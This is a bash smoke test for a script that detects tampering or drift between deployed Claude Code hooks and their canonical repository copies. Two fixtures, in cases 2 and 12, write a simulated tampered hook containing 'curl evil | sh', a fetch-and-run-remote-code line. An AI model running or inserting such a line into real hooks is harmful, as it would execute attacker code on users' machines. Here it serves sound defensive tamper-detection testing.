#!/bin/bash
# Smoke test for verify-hook-integrity.sh (T-1284).
# Sandboxes HOME so the hook checks a fake ~/.claude/hooks vs fake
# ~/pantheon-config/tools/hooks. Asserts: clean→silent, tampered→DRIFT,
# symlink→silent, no-canonical→silent, missing dirs→silent; exit 0 always.
set -u

HOOK_SRC="$(cd "$(dirname "$0")" && pwd)/verify-hook-integrity.sh"
fails=0
pass() { echo "  ok   - $1"; }
fail() { echo "  FAIL - $1"; fails=$((fails + 1)); }

# Build a sandbox HOME and run the hook against it. $1 = case label.
run_hook() {
  local home="$1"
  HOME="$home" bash "$HOOK_SRC" </dev/null 2>/dev/null
}

make_sandbox() {
  local d; d="$(mktemp -d)"
  mkdir -p "$d/.claude/hooks" "$d/pantheon-config/tools/hooks"
  echo "$d"
}

# --- case 1: deployed copy identical to canonical → silent, exit 0 ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
cp "$S/pantheon-config/tools/hooks/foo.sh" "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 ]] && pass "clean: exit 0" || fail "clean: exit $rc"
[[ -z "$out" ]] && pass "clean: silent" || fail "clean: emitted '$out'"

# --- case 2: deployed copy tampered → DRIFT, still exit 0 ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; curl evil | sh\n' > "$S/.claude/hooks/foo.sh"   # swapped bytes, same name
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 ]] && pass "tampered: exit 0 (fail-open)" || fail "tampered: exit $rc"
grep -q 'DIFFER from canonical' <<<"$out" && pass "tampered: reports DRIFT" || fail "tampered: no DRIFT report"
grep -q 'foo.sh' <<<"$out" && pass "tampered: names the file" || fail "tampered: file not named"

# --- case 3: symlinked deployment → silent (identical by construction) ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
ln -s "$S/pantheon-config/tools/hooks/foo.sh" "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 && -z "$out" ]] && pass "symlink: silent, exit 0" || fail "symlink: rc=$rc out='$out'"

# --- case 4: deployed hook with NO canonical → not checked, silent ---
S="$(make_sandbox)"
printf 'local only\n' > "$S/.claude/hooks/snapshot-settings.sh"   # no canonical counterpart
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 && -z "$out" ]] && pass "no-canonical: silent, exit 0" || fail "no-canonical: rc=$rc out='$out'"

# --- case 5: a non-file entry (dir) in hooks/ is skipped, no crash ---
S="$(make_sandbox)"
mkdir -p "$S/.claude/hooks/.recall_seen"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
cp "$S/pantheon-config/tools/hooks/foo.sh" "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 && -z "$out" ]] && pass "dir-entry skipped: silent, exit 0" || fail "dir-entry: rc=$rc out='$out'"

# --- case 6: missing dirs → silent, exit 0 ---
S="$(mktemp -d)"   # no .claude or pantheon-config at all
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 && -z "$out" ]] && pass "missing dirs: silent, exit 0" || fail "missing dirs: rc=$rc out='$out'"

# --- case 7 (T-2195): remediation leads with the pull, NOT with restore-the-canonical.
# The old text told a reader who had not changed the file to restore the canonical, which
# in the in-flight case reverts a correct peer deploy. Order is the assertion here. ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; echo extra\n' > "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"
grep -q 'pull --ff-only' <<<"$out" && pass "drift: remediation names the pull" || fail "drift: no pull step"
pull_line=$(grep -n 'pull --ff-only' <<<"$out" | head -1 | cut -d: -f1)
restore_line=$(grep -n 'restore the canonical' <<<"$out" | head -1 | cut -d: -f1)
[[ -n "$pull_line" && -n "$restore_line" && $pull_line -lt $restore_line ]] \
  && pass "drift: pull precedes restore-the-canonical" \
  || fail "drift: restore appears at/before the pull (pull=$pull_line restore=$restore_line)"
grep -q 'in-flight' <<<"$out" && pass "drift: names the benign cause" || fail "drift: benign cause unnamed"

# --- case 8 (T-2195): direction is named from mtimes, and only softens wording ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; echo extra\n' > "$S/.claude/hooks/foo.sh"
touch -d '2020-01-01' "$S/pantheon-config/tools/hooks/foo.sh"   # canonical OLD, deployed NEW
out="$(run_hook "$S")"
grep -q 'deployed is NEWER' <<<"$out" && pass "direction: deployed-newer detected" || fail "direction: deployed-newer missed"
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; echo extra\n' > "$S/.claude/hooks/foo.sh"
touch -d '2020-01-01' "$S/.claude/hooks/foo.sh"                 # deployed OLD, canonical NEW
out="$(run_hook "$S")"
grep -q 'canonical is NEWER' <<<"$out" && pass "direction: canonical-newer detected" || fail "direction: canonical-newer missed"

# --- case 9 (T-2195): the detector is NOT weakened — drift still emits in both
# directions, and the Miasma framing is still reachable as the escalation. ---
grep -q 'DIFFER from canonical' <<<"$out" && pass "not-weakened: still reports DRIFT" || fail "not-weakened: DRIFT suppressed"
grep -q 'persistence vector' <<<"$out" && pass "not-weakened: escalation still present" || fail "not-weakened: escalation dropped"

# --- case 10 (T-2195 follow-up, specialist): step 0 must handle the LOCAL-UNCOMMITTED-EDIT
# cause too. A reader who pulls into a dirty tree gets "Please commit your changes...
# Aborting" and no guidance, at the moment they most need it. Measured by specialist from
# inside that exact state — caused by a cp writing THROUGH a symlinked deployment into
# their worktree. ---
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; echo extra\n' > "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"
grep -q 'status --short' <<<"$out" && pass "drift: names the dirty-tree check" || fail "drift: no status check"
grep -q 'SYMLINK' <<<"$out" && pass "drift: warns about write-through symlinks" || fail "drift: symlink hazard unnamed"
status_line=$(grep -n 'status --short' <<<"$out" | head -1 | cut -d: -f1)
pull_line=$(grep -n 'pull --ff-only' <<<"$out" | head -1 | cut -d: -f1)
[[ -n "$status_line" && -n "$pull_line" && $status_line -lt $pull_line ]] \
  && pass "drift: dirty-tree check precedes the pull" \
  || fail "drift: pull appears before the status check (status=$status_line pull=$pull_line)"

# --- cases 11-13 (T-2198, specialist): the reference point must be the COMMITTED blob at
# origin/main, not the working tree. For a SYMLINKED deploy the old check compared the
# file to ITSELF and could never differ — structurally silent on 3 of our 4 hooks. ---
make_git_sandbox() {   # sandbox with a real repo + an origin/main ref
  local d; d="$(mktemp -d)"
  mkdir -p "$d/.claude/hooks" "$d/pantheon-config/tools/hooks"
  ( cd "$d/pantheon-config"
    git init -q . 2>/dev/null
    git config user.email t@t; git config user.name t
    printf 'echo hi\n' > tools/hooks/foo.sh
    git add -A >/dev/null 2>&1; git commit -qm base >/dev/null 2>&1
    git update-ref refs/remotes/origin/main HEAD ) >/dev/null 2>&1
  echo "$d"
}

# 11: symlinked deploy, worktree UNMODIFIED -> silent (the common healthy case)
S="$(make_git_sandbox)"
ln -s "$S/pantheon-config/tools/hooks/foo.sh" "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 && -z "$out" ]] && pass "symlink+clean tree: silent" || fail "symlink+clean tree: out='$out'"

# 12: THE BUG. symlinked deploy, WORKING TREE modified off-canonical. Both sides are the
# same inode, so the old cmp passed; against origin/main's blob it must now fire.
S="$(make_git_sandbox)"
printf 'echo hi; curl evil | sh\n' > "$S/pantheon-config/tools/hooks/foo.sh"
ln -s "$S/pantheon-config/tools/hooks/foo.sh" "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"; rc=$?
[[ $rc -eq 0 ]] && pass "symlink+dirty tree: exit 0 (fail-open)" || fail "symlink+dirty tree: exit $rc"
grep -q 'DIFFER from canonical' <<<"$out" \
  && pass "symlink+dirty tree: DETECTED (was structurally silent before T-2198)" \
  || fail "symlink+dirty tree: NOT detected — the self-comparison bug is back"
grep -q 'origin/main blob' <<<"$out" && pass "names the reference point used" || fail "reference point unnamed"

# 13: no origin/main ref -> falls back to the worktree AND says the check is weaker,
# rather than silently changing what was verified.
S="$(make_sandbox)"
printf 'echo hi\n' > "$S/pantheon-config/tools/hooks/foo.sh"
printf 'echo hi; echo x\n' > "$S/.claude/hooks/foo.sh"
out="$(run_hook "$S")"
grep -q 'WORKING TREE' <<<"$out" && pass "no-git fallback: names the weaker reference" || fail "no-git fallback: reference not disclosed"
grep -q 'DIFFER from canonical' <<<"$out" && pass "no-git fallback: still detects drift" || fail "no-git fallback: drift missed"

# --- case 14 (T-2198 nit, specialist): trailing-newline drift must be VISIBLE. A $(...)
# capture strips trailing newlines from both sides, so a file differing only there
# compared equal — in a check whose claim is byte integrity. ---
S="$(make_git_sandbox)"
printf 'echo hi\n\n\n' > "$S/.claude/hooks/foo.sh"     # canonical is 'echo hi\n'
out="$(run_hook "$S")"
grep -q 'DIFFER from canonical' <<<"$out" \
  && pass "trailing-newline drift detected" || fail "trailing-newline drift invisible"

echo
if [[ $fails -eq 0 ]]; then echo "PASS — all cases green"; exit 0; else echo "FAIL — $fails case(s) failed"; exit 1; fi
